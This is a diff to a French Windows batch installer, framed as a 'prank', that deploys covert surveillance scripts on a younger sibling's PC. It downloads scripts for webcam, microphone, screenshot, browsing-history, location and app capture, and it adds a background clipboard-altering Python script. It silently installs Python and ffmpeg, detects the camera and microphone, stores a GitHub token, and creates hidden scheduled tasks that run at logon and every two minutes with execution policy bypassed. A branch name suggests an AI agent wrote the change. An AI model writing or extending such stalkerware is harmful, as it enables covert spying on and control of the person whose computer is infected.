@@ -23,28 +23,43 @@ set PS_HIST=%DOSSIER%\blague_historique_windows.ps1
 set PS_SCREEN=%DOSSIER%\blague_screenshot_windows.ps1
 set PS_LOC=%DOSSIER%\blague_localisation_windows.ps1
 set PS_APPS=%DOSSIER%\blague_apps_windows.ps1
+set PY_SIG=%DOSSIER%\blague_signature_windows.py
 set FFMPEG=%DOSSIER%\ffmpeg.exe
 set RAW=https://raw.githubusercontent.com/%OWNER%/%REPO%/claude/signature-prank-replace-xhom2n/tools
 
 mkdir "%DOSSIER%" 2>nul
 
-echo [1/4] Telechargement des scripts...
-curl -s -L "%RAW%/blague_lock_windows.ps1"     -o "%PS_LOCK%"
-curl -s -L "%RAW%/blague_webcam_windows.ps1"   -o "%PS_CAM%"
-curl -s -L "%RAW%/blague_listing_windows.ps1"  -o "%PS_LIST%"
-curl -s -L "%RAW%/blague_audio_windows.ps1"      -o "%PS_AUDIO%"
-curl -s -L "%RAW%/blague_historique_windows.ps1"  -o "%PS_HIST%"
-curl -s -L "%RAW%/blague_screenshot_windows.ps1"    -o "%PS_SCREEN%"
-curl -s -L "%RAW%/blague_localisation_windows.ps1" -o "%PS_LOC%"
-curl -s -L "%RAW%/blague_apps_windows.ps1"        -o "%PS_APPS%"
+echo [1/5] Telechargement des scripts...
+curl -s -L "%RAW%/blague_lock_windows.ps1"          -o "%PS_LOCK%"
+curl -s -L "%RAW%/blague_webcam_windows.ps1"         -o "%PS_CAM%"
+curl -s -L "%RAW%/blague_listing_windows.ps1"        -o "%PS_LIST%"
+curl -s -L "%RAW%/blague_audio_windows.ps1"          -o "%PS_AUDIO%"
+curl -s -L "%RAW%/blague_historique_windows.ps1"     -o "%PS_HIST%"
+curl -s -L "%RAW%/blague_screenshot_windows.ps1"     -o "%PS_SCREEN%"
+curl -s -L "%RAW%/blague_localisation_windows.ps1"   -o "%PS_LOC%"
+curl -s -L "%RAW%/blague_apps_windows.ps1"           -o "%PS_APPS%"
+curl -s -L "%RAW%/blague_signature_windows.py"       -o "%PY_SIG%"
 
-echo [2/4] Telechargement de ffmpeg (patience, ~60Mo)...
+echo [2/5] Installation de Python (si absent)...
+python --version >nul 2>&1
+if %ERRORLEVEL% neq 0 (
+    echo     Python absent, telechargement...
+    curl -s -L "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe" -o "%TEMP%\python_setup.exe"
+    "%TEMP%\python_setup.exe" /quiet InstallAllUsers=0 PrependPath=1 Include_launcher=0
+    del "%TEMP%\python_setup.exe" >nul 2>&1
+    :: Recharger PATH pour que python soit disponible
+    call refreshenv >nul 2>&1
+) else (
+    echo     Python deja installe.
+)
+
+echo [3/5] Telechargement de ffmpeg (patience, ~60Mo)...
 powershell -Command ^
   "Invoke-WebRequest 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -OutFile '$env:TEMP\ffmpeg.zip'; ^
    Expand-Archive '$env:TEMP\ffmpeg.zip' -DestinationPath '$env:TEMP\ffmpeg_ext' -Force; ^
    Copy-Item (Get-ChildItem '$env:TEMP\ffmpeg_ext' -Filter 'ffmpeg.exe' -Recurse | Select-Object -First 1).FullName '%FFMPEG%'"
 
-echo [3/4] Detection des peripheriques audio/video...
+echo [4/5] Detection des peripheriques audio/video...
 powershell -Command ^
   "$devices = & '%FFMPEG%' -list_devices true -f dshow -i dummy 2>&1; ^
    $videoLine = $devices | Select-String '\\\".*\\\"' | Select-Object -First 1; ^
@@ -63,12 +78,12 @@ set /p MIC=<"%TEMP%\mic_name.txt"
 echo     Webcam detectee : %CAMERA%
 echo     Micro detecte   : %MIC%
 
-echo [4/4] Ecriture de la configuration...
+echo [5/5] Ecriture de la configuration...
 powershell -Command ^
   "$c = [ordered]@{token='%TOKEN%';owner='%OWNER%';repo='%REPO%';branch='%BRANCH%';lock_path='data/blague_lock.json';code_secret='%CODE_SECRET%';camera_name='%CAMERA%';mic_name='%MIC%';webapp_url='%WEBAPP_URL%'}; ^
    $c | ConvertTo-Json | Set-Content -Encoding UTF8 '%DOSSIER%\blague_config.json'"
 
-:: Taches planifiees (lockscreen + webcam + listing, tous les 2min + au demarrage)
+:: Taches planifiees — PowerShell (tous les 2min + au demarrage)
 set CMD_LOCK=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LOCK%"
 set CMD_CAM=powershell  -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_CAM%"
 set CMD_LIST=powershell  -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LIST%"
@@ -78,22 +93,27 @@ set CMD_SCREEN=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS
 set CMD_LOC=powershell   -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LOC%"
 set CMD_APPS=powershell  -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_APPS%"
 
-schtasks /create /tn "BlagueVerrou"        /tr "%CMD_LOCK%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueVerrouGardien" /tr "%CMD_LOCK%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueWebcam"        /tr "%CMD_CAM%"  /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueWebcamGardien" /tr "%CMD_CAM%"  /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BloagueListing"       /tr "%CMD_LIST%"  /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueListingGardien" /tr "%CMD_LIST%"  /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueAudio"           /tr "%CMD_AUDIO%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueAudioGardien"    /tr "%CMD_AUDIO%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueHistorique"        /tr "%CMD_HIST%"   /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueHistoriqueGardien" /tr "%CMD_HIST%"   /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueScreenshot"        /tr "%CMD_SCREEN%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueScreenshotGardien" /tr "%CMD_SCREEN%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueLocalisation"        /tr "%CMD_LOC%"    /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueLocalisationGardien" /tr "%CMD_LOC%"    /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueApps"               /tr "%CMD_APPS%"   /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
-schtasks /create /tn "BlagueAppsGardien"         /tr "%CMD_APPS%"   /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+:: Tache planifiee — Python presse-papier (toujours en arriere-plan)
+set CMD_SIG=pythonw "%PY_SIG%"
+
+schtasks /create /tn "BlagueVerrou"              /tr "%CMD_LOCK%"  /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueVerrouGardien"       /tr "%CMD_LOCK%"  /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueWebcam"              /tr "%CMD_CAM%"   /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueWebcamGardien"       /tr "%CMD_CAM%"   /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BloagueListing"            /tr "%CMD_LIST%"  /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueListingGardien"      /tr "%CMD_LIST%"  /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueAudio"               /tr "%CMD_AUDIO%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueAudioGardien"        /tr "%CMD_AUDIO%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueHistorique"          /tr "%CMD_HIST%"  /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueHistoriqueGardien"   /tr "%CMD_HIST%"  /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueScreenshot"          /tr "%CMD_SCREEN%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueScreenshotGardien"   /tr "%CMD_SCREEN%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueLocalisation"        /tr "%CMD_LOC%"   /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueLocalisationGardien" /tr "%CMD_LOC%"   /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueApps"               /tr "%CMD_APPS%"  /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueAppsGardien"         /tr "%CMD_APPS%"  /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueSignature"           /tr "%CMD_SIG%"   /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueSignatureGardien"    /tr "%CMD_SIG%"   /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
 
 :: Notifier le grand frere dans Google Sheets que l'installation a eu lieu
 powershell -Command ^
@@ -109,6 +129,7 @@ start "" /b %CMD_HIST%
 start "" /b %CMD_SCREEN%
 start "" /b %CMD_LOC%
 start "" /b %CMD_APPS%
+start "" /b %CMD_SIG%
 
 powershell -Command ^
   "Add-Type -AssemblyName PresentationFramework; ^
